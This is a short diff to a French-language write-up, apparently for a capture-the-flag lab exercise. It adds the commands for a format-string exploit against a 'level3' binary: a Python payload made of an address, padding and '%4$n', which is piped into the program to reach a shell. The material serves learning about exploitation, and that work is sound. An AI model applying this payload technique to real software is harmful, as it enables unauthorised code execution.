@@ -52,3 +52,7 @@ obtenir 64, le resultat que nous voulons, a imprimer 60 charactères
 supplémentaires, ce qui nous permet d'avoir acces au shell:
 
 ![Capture d’écran 2020-08-09 à 22 5944](https://user-images.githubusercontent.com/25014717/89741731-0d37d800-da94-11ea-94fd-737be836d6d0.png)
+
+`$ python -c 'print "\x8c\x98\x04\x08" + "B" * 60 + "%4$n"' > /tmp/lvl3xpl`
+`$ cat /tmp/lvl3xpl - |./level3`
+
